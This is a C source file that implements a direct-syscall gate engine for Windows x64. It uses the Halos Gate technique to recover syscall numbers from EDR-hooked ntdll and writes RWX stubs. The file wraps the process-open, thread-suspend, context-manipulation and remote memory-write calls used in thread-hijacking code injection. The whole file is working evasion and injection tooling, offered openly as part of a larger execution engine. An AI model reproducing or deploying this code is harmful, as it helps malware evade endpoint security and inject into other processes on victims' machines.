/*
 * syscall_gate.c — Direct Syscall Stub Engine (Enhancement 3)
 * execution_engine/syscall_gate/syscall_gate.c
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Builds one 16-byte RWX gate stub per NT function in a single
 * VirtualAlloc'd slab.  All 9 stubs share the same wire format:
 *
 *   offset  bytes                mnemonic
 *   0       4C 8B D1             mov r10, rcx     ; Windows syscall ABI
 *   3       B8 [lo] [hi] 00 00   mov eax, SSN     ; SSN patched at init
 *   8       0F 05                syscall
 *   10      C3                   ret
 *   11..15  00 × 5               padding to 16-byte stride
 *
 * SSN resolution — Halos Gate:
 *   1. Parse loaded ntdll PE export directory.
 *   2. Find export by name; check first 4 bytes of stub in memory:
 *        4C 8B D1 B8  → clean; SSN = *(WORD *)(stub + 4)
 *        E9 ...       → hooked (EDR JMP trampoline)
 *   3. Hooked path: build VA-sorted array of all ntdll exports.
 *      Walk ±step neighbors; first clean neighbor at distance K gives
 *        forward neighbor: SSN_target = SSN_neighbor - K
 *        backward neighbor: SSN_target = SSN_neighbor + K
 *   4. Fail after MAX_WALK steps (all neighbors hooked — extremely rare).
 *
 * Gates (9 total):
 *   NtOpenProcess / NtOpenThread
 *   NtSuspendThread / NtGetContextThread / NtSetContextThread / NtResumeThread
 *   NtAllocateVirtualMemory / NtWriteVirtualMemory / NtFreeVirtualMemory
 *
 * Build:
 *   clang syscall_gate.c -Iexecution_engine -lkernel32 (linked via main build)
 */

#include "syscall_gate.h"
#include <stdio.h>
#include <string.h>

/* ============================================================
   CONSTANTS
   ============================================================ */

#define STUB_STRIDE   16     /* bytes per gate slot in slab */
#define MAX_WALK      48     /* max neighbor steps for Halos Gate */

/* ============================================================
   GATE TABLE
   ============================================================ */

typedef struct {
    const char *name;   /* ntdll export name */
    WORD        ssn;    /* resolved at sgx_init() */
    BYTE       *stub;   /* pointer into g_slab     */
} GATE;

enum {
    GI_OPENPROCESS = 0,
    GI_OPENTHREAD,
    GI_SUSPEND,
    GI_GETCTX,
    GI_SETCTX,
    GI_RESUME,
    GI_ALLOCVM,
    GI_WRITEVM,
    GI_FREEVM,
    GATE_COUNT          /* 9 */
};

static GATE g_gates[GATE_COUNT] = {
    [GI_OPENPROCESS] = { "NtOpenProcess"           },
    [GI_OPENTHREAD]  = { "NtOpenThread"             },
    [GI_SUSPEND]     = { "NtSuspendThread"          },
    [GI_GETCTX]      = { "NtGetContextThread"       },
    [GI_SETCTX]      = { "NtSetContextThread"       },
    [GI_RESUME]      = { "NtResumeThread"           },
    [GI_ALLOCVM]     = { "NtAllocateVirtualMemory"  },
    [GI_WRITEVM]     = { "NtWriteVirtualMemory"     },
    [GI_FREEVM]      = { "NtFreeVirtualMemory"      },
};

/* One RWX page shared across all 9 stubs */
static BYTE *g_slab = NULL;

/*
 * Gate stub template — SSN placeholder at bytes [4..5], zero-filled.
 * memcpy'd into each slot then patched with the resolved SSN.
 */
static const BYTE k_tmpl[STUB_STRIDE] = {
    0x4C, 0x8B, 0xD1,              /* mov r10, rcx       */
    0xB8, 0x00, 0x00, 0x00, 0x00,  /* mov eax, <SSN>     */
    0x0F, 0x05,                    /* syscall            */
    0xC3,                          /* ret                */
    0x00, 0x00, 0x00, 0x00, 0x00   /* padding × 5        */
};

/* ============================================================
   PE EXPORT HELPERS
   ============================================================ */

/*
 * XENTRY — (RVA, function-table index) pair for VA-sorted Halos Gate walk.
 */
typedef struct {
    DWORD rva;
    DWORD ord_idx;
} XENTRY;

/*
 * sort_xentries — ascending insertion sort by RVA.
 * O(n²) is fine; ntdll has ~2500 exports and we call this once per process.
 */
static void sort_xentries(XENTRY *arr, DWORD n)
{
    for (DWORD i = 1; i < n; i++) {
        XENTRY key = arr[i];
        int    j   = (int)i - 1;
        while (j >= 0 && arr[j].rva > key.rva) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = key;
    }
}

/*
 * is_clean — TRUE if stub[0..3] == {4C 8B D1 B8}, i.e. untouched syscall stub.
 * Fills *ssn_out with the embedded SSN on success.
 */
static BOOL is_clean(const BYTE *stub, WORD *ssn_out)
{
    if (stub[0] == 0x4C && stub[1] == 0x8B &&
        stub[2] == 0xD1 && stub[3] == 0xB8)
    {
        /* SSN lives in the low WORD of the imm32 of 'mov eax, imm32' */
        *ssn_out = *(const WORD *)(stub + 4);
        return TRUE;
    }
    return FALSE;
}

/*
 * resolve_ssn — locate fn_name in the loaded ntdll and extract its SSN.
 *
 * Fast path: first 4 bytes match clean syscall stub → read SSN directly.
 * Halos Gate path: first byte is 0xE9 (EDR inline hook) → sort all exports
 *   by VA and walk neighbors until a clean one is found.
 *
 * Returns TRUE + *ssn_out on success; FALSE on any failure.
 */
static BOOL resolve_ssn(BYTE *ntdll, const char *fn_name, WORD *ssn_out)
{
    /* *the export table: a map of every promise the module ever made* */

    /* ── parse PE export directory ── */
    IMAGE_DOS_HEADER       *dos = (IMAGE_DOS_HEADER *)ntdll;
    IMAGE_NT_HEADERS       *nt  = (IMAGE_NT_HEADERS *)(ntdll + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY   *dd  = &nt->OptionalHeader
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(ntdll + dd->VirtualAddress);

    DWORD  n_names  = exp->NumberOfNames;
    DWORD  n_funcs  = exp->NumberOfFunctions;
    DWORD *names    = (DWORD *)(ntdll + exp->AddressOfNames);
    WORD  *name_ord = (WORD  *)(ntdll + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(ntdll + exp->AddressOfFunctions);

    /* ── locate target export by name ── */
    DWORD tgt_ord = 0;
    DWORD tgt_rva = 0;
    BOOL  found   = FALSE;

    for (DWORD i = 0; i < n_names; i++) {
        if (strcmp((const char *)(ntdll + names[i]), fn_name) == 0) {
            tgt_ord = name_ord[i];
            tgt_rva = funcs[tgt_ord];
            found   = TRUE;
            break;
        }
    }

    if (!found) {
        printf("[sgx] export not found: %s\n", fn_name);
        return FALSE;
    }

    /* ── fast path: clean stub ── */
    BYTE *stub = ntdll + tgt_rva;
    if (is_clean(stub, ssn_out)) return TRUE;

    /* ── classify hook ── */
    if (stub[0] != 0xE9) {
        printf("[sgx] %s: unrecognised stub[0]=0x%02X; cannot recover SSN\n",
               fn_name, stub[0]);
        return FALSE;
    }

    printf("[sgx] %s: hooked (E9 JMP) — activating Halos Gate\n", fn_name);

    /* ── Halos Gate: build VA-sorted export table ──
     *
     * Cap at 4096 — ntdll x64 has ~2500; anything larger is malformed.
     * We fill sorted[] from AddressOfFunctions (ordinal-indexed),
     * then sort ascending by RVA.  The Nt* syscall cluster is dense and
     * contiguous in VA space, so neighbors within ±MAX_WALK carry a
     * predictable SSN offset.                                           */
    if (n_funcs > 4096) n_funcs = 4096;

    XENTRY *sorted = (XENTRY *)HeapAlloc(GetProcessHeap(),
                                          HEAP_ZERO_MEMORY,
                                          n_funcs * sizeof(XENTRY));
    if (!sorted) {
        printf("[sgx] HeapAlloc for Halos Gate table failed\n");
        return FALSE;
    }

    for (DWORD i = 0; i < n_funcs; i++) {
        sorted[i].rva     = funcs[i];
        sorted[i].ord_idx = i;
    }
    sort_xentries(sorted, n_funcs);

    /* find target's position in sorted array by RVA */
    int tgt_si = -1;
    for (DWORD i = 0; i < n_funcs; i++) {
        if (sorted[i].rva == tgt_rva) {
            tgt_si = (int)i;
            break;
        }
    }

    BOOL ok = FALSE;

    if (tgt_si < 0) {
        printf("[sgx] %s: RVA not found in sorted export table\n", fn_name);
    } else {
        for (int step = 1; step <= MAX_WALK && !ok; step++) {

            /* ── forward neighbor: SSN_target = SSN_neighbor - step ── */
            int fi = tgt_si + step;
            if (fi < (int)n_funcs) {
                WORD nb_ssn = 0;
                if (is_clean(ntdll + sorted[fi].rva, &nb_ssn)) {
                    *ssn_out = (WORD)(nb_ssn - (WORD)step);
                    printf("[sgx] %s: recovered SSN=0x%04hX via +%d neighbor\n",
                           fn_name, *ssn_out, step);
                    ok = TRUE;
                    break;
                }
            }

            /* ── backward neighbor: SSN_target = SSN_neighbor + step ── */
            int bi = tgt_si - step;
            if (bi >= 0) {
                WORD nb_ssn = 0;
                if (is_clean(ntdll + sorted[bi].rva, &nb_ssn)) {
                    *ssn_out = (WORD)(nb_ssn + (WORD)step);
                    printf("[sgx] %s: recovered SSN=0x%04hX via -%d neighbor\n",
                           fn_name, *ssn_out, step);
                    ok = TRUE;
                    break;
                }
            }
        }

        if (!ok)
            printf("[sgx] %s: Halos Gate exhausted (%d steps)\n", fn_name, MAX_WALK);
    }

    HeapFree(GetProcessHeap(), 0, sorted);
    return ok;
}

/* ============================================================
   PUBLIC: sgx_init / sgx_cleanup
   ============================================================ */

/*
 * sgx_init — resolve all 9 SSNs, allocate RWX slab, write gate stubs.
 *
 * Call order in test_phase12.c:
 *   unhook_ntdll()  ← restore clean .text first (E4)
 *   sgx_init()      ← now sees unhooked stubs; fast-path fires for all 9
 *
 * Returns TRUE only when every gate is resolved.
 * On partial failure, the slab is left allocated for diagnostics;
 * sgx_cleanup() always frees it safely.
 */
BOOL sgx_init(void)
{
    /* *the slab: nine promises the kernel will keep, whether ntdll does or not* */

    BYTE *ntdll = (BYTE *)GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[sgx] GetModuleHandleA(ntdll) failed — impossible on Windows\n");
        return FALSE;
    }

    g_slab = (BYTE *)VirtualAlloc(NULL,
                                  GATE_COUNT * STUB_STRIDE,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    if (!g_slab) {
        printf("[sgx] VirtualAlloc(slab %d bytes) failed error=%lu\n",
               GATE_COUNT * STUB_STRIDE, GetLastError());
        return FALSE;
    }

    BOOL all_ok = TRUE;

    for (int i = 0; i < GATE_COUNT; i++) {
        WORD ssn = 0;

        if (!resolve_ssn(ntdll, g_gates[i].name, &ssn)) {
            printf("[sgx] FAILED to resolve: %s\n", g_gates[i].name);
            all_ok = FALSE;
            g_gates[i].stub = NULL;
            continue;
        }

        BYTE *slot = g_slab + (i * STUB_STRIDE);

        /* write template then patch the SSN into the imm32 field */
        memcpy(slot, k_tmpl, STUB_STRIDE);
        memcpy(slot + 4, &ssn, sizeof(WORD));   /* low WORD of imm32 */

        g_gates[i].ssn  = ssn;
        g_gates[i].stub = slot;

        printf("[sgx]  %-32s SSN=0x%04hX  stub=%p\n",
               g_gates[i].name, ssn, (void *)slot);
    }

    return all_ok;
}

/*
 * sgx_cleanup — free the RWX slab.
 * Safe to call even if sgx_init() was never called or failed.
 */
void sgx_cleanup(void)
{
    if (g_slab) {
        VirtualFree(g_slab, 0, MEM_RELEASE);
        g_slab = NULL;
    }
}

/* ============================================================
   TYPED WRAPPERS
   ============================================================
   Every wrapper casts g_gates[GI_*].stub to the exact NT API
   prototype, matching the calling convention the kernel expects.
   The stub's 'mov r10, rcx' satisfies the Windows x64 syscall ABI:
   rcx (first arg) must be mirrored into r10 before the syscall
   instruction because rcx is trashed by the CPU during the transition.
   ============================================================ */

/*
 * sgx_NtOpenProcess
 * NT: NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID)
 *
 * Opens a process handle by PID.  ObjectAttributes carries only Length;
 * ClientId carries UniqueProcess=pid, UniqueThread=NULL.
 */
NTSTATUS sgx_NtOpenProcess(PHANDLE out, ACCESS_MASK access, DWORD pid)
{
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE,
                                   ACCESS_MASK,
                                   SGX_OBJ_ATTR *,
                                   SGX_CLIENT_ID *);

    SGX_OBJ_ATTR  oa  = { (ULONG)sizeof(SGX_OBJ_ATTR), NULL, NULL, 0, NULL, NULL };
    SGX_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)pid, NULL };

    return ((fn_t)g_gates[GI_OPENPROCESS].stub)(out, access, &oa, &cid);
}

/*
 * sgx_NtOpenThread
 * NT: NtOpenThread(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID)
 *
 * Opens a thread handle by TID.  ClientId carries UniqueProcess=NULL,
 * UniqueThread=tid.
 */
NTSTATUS sgx_NtOpenThread(PHANDLE out, ACCESS_MASK access, DWORD tid)
{
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE,
                                   ACCESS_MASK,
                                   SGX_OBJ_ATTR *,
                                   SGX_CLIENT_ID *);

    SGX_OBJ_ATTR  oa  = { (ULONG)sizeof(SGX_OBJ_ATTR), NULL, NULL, 0, NULL, NULL };
    SGX_CLIENT_ID cid = { NULL, (HANDLE)(ULONG_PTR)tid };

    return ((fn_t)g_gates[GI_OPENTHREAD].stub)(out, access, &oa, &cid);
}

/*
 * sgx_NtSuspendThread
 * NT: NtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount)
 */
NTSTATUS sgx_NtSuspendThread(HANDLE hThread, PULONG prev_suspend)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PULONG);
    return ((fn_t)g_gates[GI_SUSPEND].stub)(hThread, prev_suspend);
}

/*
 * sgx_NtGetContextThread
 * NT: NtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext)
 */
NTSTATUS sgx_NtGetContextThread(HANDLE hThread, PCONTEXT ctx)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PCONTEXT);
    return ((fn_t)g_gates[GI_GETCTX].stub)(hThread, ctx);
}

/*
 * sgx_NtSetContextThread
 * NT: NtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext)
 */
NTSTATUS sgx_NtSetContextThread(HANDLE hThread, PCONTEXT ctx)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PCONTEXT);
    return ((fn_t)g_gates[GI_SETCTX].stub)(hThread, ctx);
}

/*
 * sgx_NtResumeThread
 * NT: NtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount)
 */
NTSTATUS sgx_NtResumeThread(HANDLE hThread, PULONG prev_suspend)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PULONG);
    return ((fn_t)g_gates[GI_RESUME].stub)(hThread, prev_suspend);
}

/*
 * sgx_NtAllocateVirtualMemory
 * NT: NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR ZeroBits,
 *                              SIZE_T*, ULONG AllocType, ULONG Protect)
 *
 * ZeroBits is always 0 here — we want the allocator to pick any address.
 * *size is in/out: caller sets desired size; kernel rounds to page boundary.
 */
NTSTATUS sgx_NtAllocateVirtualMemory(HANDLE  hProc,
                                      PVOID  *base,
                                      SIZE_T *size,
                                      ULONG   alloc_type,
                                      ULONG   protect)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE,
                                   PVOID *,
                                   ULONG_PTR,
                                   SIZE_T *,
                                   ULONG,
                                   ULONG);
    ULONG_PTR zero_bits = 0;
    return ((fn_t)g_gates[GI_ALLOCVM].stub)(hProc, base,
                                             zero_bits, size,
                                             alloc_type, protect);
}

/*
 * sgx_NtWriteVirtualMemory
 * NT: NtWriteVirtualMemory(HANDLE, PVOID Base, PVOID Buf,
 *                           SIZE_T Len, SIZE_T* Written)
 */
NTSTATUS sgx_NtWriteVirtualMemory(HANDLE  hProc,
                                   PVOID   base,
                                   PVOID   buf,
                                   SIZE_T  len,
                                   SIZE_T *written)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T *);
    return ((fn_t)g_gates[GI_WRITEVM].stub)(hProc, base, buf, len, written);
}

/*
 * sgx_NtFreeVirtualMemory
 * NT: NtFreeVirtualMemory(HANDLE, PVOID* Base, SIZE_T* Size, ULONG FreeType)
 *
 * For MEM_RELEASE: *base = region base, *size = 0.
 * Kernel sets both to the actual freed values on return.
 */
NTSTATUS sgx_NtFreeVirtualMemory(HANDLE  hProc,
                                  PVOID  *base,
                                  SIZE_T *size,
                                  ULONG   free_type)
{
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, SIZE_T *, ULONG);
    return ((fn_t)g_gates[GI_FREEVM].stub)(hProc, base, size, free_type);
}